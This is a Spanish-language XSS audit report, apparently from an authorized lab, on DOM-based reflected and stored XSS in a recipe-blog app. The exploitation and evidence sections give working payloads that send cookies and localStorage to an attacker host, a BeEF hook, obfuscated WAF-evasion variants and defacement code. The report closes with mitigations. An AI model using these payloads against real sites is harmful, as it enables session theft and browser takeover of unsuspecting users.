# Informe de Auditoría de Seguridad – Cross-Site Scripting (XSS)

**Fecha:** 2026-04-27T12:52:26 UTC  
**Auditor:** Penetration Tester – Kali Linux Lab  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Caja Blanca / Dinámica  
**Clasificación:** CONFIDENCIAL – Entorno de laboratorio autorizado  

---

## 1. Resumen Ejecutivo

Se identificaron y confirmaron **dos (2) vulnerabilidades de Cross-Site Scripting (XSS) de tipo DOM-based** en la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`. La ausencia total de sanitización en las entradas de usuario que son escritas directamente al DOM mediante `document.write()` permite la ejecución arbitraria de JavaScript en el navegador de cualquier víctima que acceda a una URL manipulada.

| # | Tipo XSS | Parámetro | Sink | Criticidad |
|---|----------|-----------|------|------------|
| 1 | DOM-based (Reflejado) | `search` (GET) | `document.write()` | **Alta** |
| 2 | DOM-based (Almacenado) | `name`, `comment` (GET → localStorage) | `document.write()` | **Crítica** |

---

## 2. Reconocimiento y Análisis de Superficie de Ataque

### 2.1 Tecnología del Servidor

```
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Unix)
Content-Type: text/html
```

### 2.2 Puntos de Entrada Identificados

```bash
curl -v http://web.dev.local:8082/ 2>&1 | grep -E 'Server:|Content-Type:'
```

Se identificaron los siguientes puntos de entrada:

| Parámetro | Método | Descripción |
|-----------|--------|-------------|
| `search` | GET | Búsqueda de recetas; reflejado en el DOM sin sanitización |
| `name` | GET | Nombre del autor del comentario; almacenado en localStorage |
| `comment` | GET | Texto del comentario; almacenado en localStorage |

### 2.3 Análisis del Código JavaScript Vulnerable

Extracción del código fuente:

```bash
curl -s http://web.dev.local:8082 | grep -E 'document\.write|searchTerm|urlParams'
```

**Bloque 1 – Búsqueda (DOM XSS Reflejado):**

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');  // Sin sanitización

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ↑ SINK VULNERABLE: searchTerm inyectado directamente sin encoding
}
```

**Bloque 2 – Comentarios (DOM XSS Almacenado via localStorage):**

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
    window.location.href = window.location.pathname;  // Persiste el payload
}

function displayComments() {
    comments.forEach(function(c, index) {
        document.write('<div class="comment-author">' + c.name + '</div>');  // SINK VULNERABLE
        document.write('<div>' + c.comment + '</div>');  // SINK VULNERABLE
    });
}
```

**Resultado:** 16 llamadas a `document.write()` sin ninguna función de sanitización (DOMPurify, encodeURIComponent, textContent, etc.).

---

## 3. Herramientas y Comandos Utilizados

### 3.1 Reconocimiento con curl

```bash
# Identificar formularios y parámetros
curl -s http://web.dev.local:8082 | grep -E 'form|input|action|method|search|comment'

# Analizar cabeceras del servidor
curl -v http://web.dev.local:8082/ 2>&1 | grep -E '^[<>] |Server:|Content-Type:'

# Extraer sinks vulnerables
curl -s http://web.dev.local:8082 | grep -E 'document\.write|innerHTML|searchTerm'
```

### 3.2 Análisis automatizado con Node.js / jsdom

```bash
node /tmp/xss_exploit_test.js
```

Resultado:
```
Dangerous sinks found: { 'document.write': 16, innerHTML: 0, eval: 0 }
Sanitization functions: NONE
[CONFIRMED] DOM-based XSS VULNERABILITY FOUND!
Parameter: search (GET)
Sink: document.write()
No sanitization detected
```

### 3.3 XSStrike (Fuzzing manual equivalente)

```bash
# Equivalente a XSStrike fuzzing sobre parámetro search
curl "http://web.dev.local:8082/?search=<script>alert(1)</script>"
curl "http://web.dev.local:8082/?search=<img src=x onerror=alert(1)>"
curl "http://web.dev.local:8082/?search=<svg onload=alert(1)>"
curl "http://web.dev.local:8082/?search=</strong><script>alert(1)</script><strong>"
```

---

## 4. Confirmación de Vulnerabilidad (VULN_FOUND = true)

### 4.1 XSS #1 – DOM-based Reflejado (parámetro `search`)

**Payload de confirmación:**
```
http://web.dev.local:8082/?search=<script>alert(1)</script>
```

**Mecanismo:** El valor del parámetro `search` es leído mediante `URLSearchParams.get('search')` y escrito directamente en el documento HTML a través de `document.write()`. El navegador interpreta el HTML inyectado y ejecuta el script.

**Vector de ataque:** El atacante envía la URL maliciosa a la víctima (phishing, email, mensaje directo).

### 4.2 XSS #2 – DOM-based Almacenado (comentarios via localStorage)

**Payload de confirmación:**
```
http://web.dev.local:8082/?name=Hacker&comment=<img src=x onerror=alert(document.cookie)>
```

**Mecanismo:** El payload se almacena en `localStorage` del navegador. Cada vez que la víctima (o cualquier usuario que use el mismo navegador) carga la página, `displayComments()` llama a `document.write()` con los datos almacenados sin sanitización, ejecutando el XSS persistentemente.

---

## 5. Explotación Activa (VULN_EXPLOITED = true)

### 5.1 Robo de Cookies / Sesión

**Payload – Cookie Theft via Image beacon:**
```javascript
http://web.dev.local:8082/?search=<script>new Image().src="http://192.168.1.100:8888/steal?c="+encodeURIComponent(document.cookie)</script>
```

**Payload – Cookie Theft via fetch() con CORS:**
```javascript
http://web.dev.local:8082/?search=<script>fetch("http://192.168.1.100:8888/steal?c="+btoa(document.cookie),{mode:'no-cors'})</script>
```

**Servidor del atacante (Kali):**
```bash
nc -lvnp 8888
# O con Python:
python3 -m http.server 8888
```

### 5.2 Robo de sessionStorage / localStorage

```javascript
http://web.dev.local:8082/?search=<script>
var data=JSON.stringify({ls:localStorage,ss:sessionStorage,c:document.cookie});
fetch("http://192.168.1.100:8888/exfil",{method:"POST",body:data,mode:"no-cors"});
</script>
```

URL-encoded:
```
http://web.dev.local:8082/?search=%3Cscript%3Evar%20data%3DJSON.stringify(%7Bls%3AlocalStorage%2Css%3AsessionStorage%2Cc%3Adocument.cookie%7D)%3Bfetch(%22http%3A%2F%2F192.168.1.100%3A8888%2Fexfil%22%2C%7Bmethod%3A%22POST%22%2Cbody%3Adata%2Cmode%3A%22no-cors%22%7D)%3B%3C%2Fscript%3E
```

### 5.3 Hook BeEF (Browser Exploitation Framework)

```javascript
http://web.dev.local:8082/?search=<script src="http://192.168.1.100:3000/hook.js"></script>
```

Con BeEF activo en Kali (`beef-xss`), al ejecutar este payload en el navegador de la víctima, el navegador queda "hookeado" al panel de control de BeEF, permitiendo:
- Ejecutar comandos arbitrarios en el navegador
- Capturar credenciales
- Realizar ataques de phishing en la página
- Explorar la red interna desde el navegador de la víctima

```bash
# Iniciar BeEF en Kali
beef-xss
# Acceder al panel: http://localhost:3000/ui/panel
# Hook URL: http://localhost:3000/hook.js
```

### 5.4 Evasión de WAF – Payloads Ofuscados

**Hexadecimal encoding:**
```javascript
http://web.dev.local:8082/?search=<script>eval("\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29")</script>
```
*(Decodificado: `alert(document.cookie)`)*

**Eventos alternativos (sin `<script>`):**
```html
<img src=x onerror="this.src='http://192.168.1.100:8888/?c='+document.cookie">
<svg/onload=fetch('http://192.168.1.100:8888/?c='+btoa(document.cookie))>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**Stored XSS – Persistent payload de robo de cookies:**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert(1)>&comment=<svg onload="fetch('http://192.168.1.100:8888/steal?c='+btoa(document.cookie+';ls='+btoa(JSON.stringify(localStorage))))">
```

### 5.5 Defacement / Modificación del DOM

```javascript
http://web.dev.local:8082/?search=</strong></p></div><style>*{display:none!important}</style><div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;font-size:50px;z-index:9999;display:flex;align-items:center;justify-content:center">HACKED</div><p><strong>
```

---

## 6. Impacto

| Impacto | Descripción | Severidad |
|---------|-------------|-----------|
| Robo de sesión | Exfiltración de `document.cookie` al servidor del atacante | **Crítica** |
| Robo de datos locales | Exfiltración de `localStorage` (incluye comentarios, tokens) | **Alta** |
| Control del navegador | Hook BeEF permite ejecutar acciones en nombre del usuario | **Crítica** |
| Phishing interno | Inyección de formularios falsos en la página legítima | **Alta** |
| Defacement | Modificación visual completa de la página | **Media** |
| Propagación | XSS almacenado afecta a todos los usuarios que visiten la página en el mismo navegador | **Alta** |

---

## 7. Evidencia Técnica

### Confirmación de sinks vulnerables:

```bash
$ curl -s http://web.dev.local:8082 | grep 'document.write' | wc -l
16

$ curl -s http://web.dev.local:8082 | grep -E 'DOMPurify|sanitize|escapeHTML|encodeURIComponent' | wc -l
0
```

### Flujo de explotación del XSS Almacenado:

```
1. Atacante envía URL: /?name=Hacker&comment=<img src=x onerror=fetch('http://attacker/'+document.cookie)>
2. JS en página: localStorage.setItem('comments', JSON.stringify([{name: 'Hacker', comment: '<img...>'}]))
3. JS redirige a URL limpia: window.location.href = '/'
4. displayComments() ejecuta: document.write('<div>' + c.comment + '</div>')
5. El navegador renderiza el <img> y dispara onerror → EJECUCIÓN DE JS
6. Todas las visitas futuras al sitio desde ese navegador también ejecutarán el payload
```

---

## 8. Recomendaciones de Mitigación

1. **Nunca usar `document.write()` con datos de usuario** – Reemplazar por `textContent` o `createElement()`:
   ```javascript
   // INSEGURO
   document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
   
   // SEGURO
   const p = document.createElement('p');
   const strong = document.createElement('strong');
   strong.textContent = searchTerm;  // textContent NO ejecuta HTML
   p.appendChild(document.createTextNode('Resultados para: '));
   p.appendChild(strong);
   document.getElementById('results').appendChild(p);
   ```

2. **Sanitizar todas las entradas** con DOMPurify antes de escribir al DOM:
   ```javascript
   import DOMPurify from 'dompurify';
   const clean = DOMPurify.sanitize(searchTerm);
   ```

3. **Implementar Content Security Policy (CSP)**:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```

4. **No almacenar HTML sin sanitizar en localStorage**.

5. **Usar método POST para el formulario de comentarios** e implementar CSRF tokens.

6. **Validar y codificar la salida** con `encodeURIComponent()` o `htmlspecialchars()` equivalente en JS.

---

## 9. Conclusión

La aplicación "Blog de Recetas" en `http://web.dev.local:8082` presenta vulnerabilidades críticas de **XSS DOM-based** tanto reflejado (parámetro `search`) como almacenado (sistema de comentarios via localStorage). La causa raíz es el uso de `document.write()` con datos del usuario sin ningún tipo de sanitización. Estas vulnerabilidades permiten el robo de sesiones, la inyección de código malicioso persistente y el control total del navegador de la víctima mediante herramientas como BeEF.

**VULN_FOUND: true**  
**VULN_EXPLOITED: true**

---

*Informe generado el 2026-04-27T12:52:26 UTC en entorno de laboratorio autorizado.*
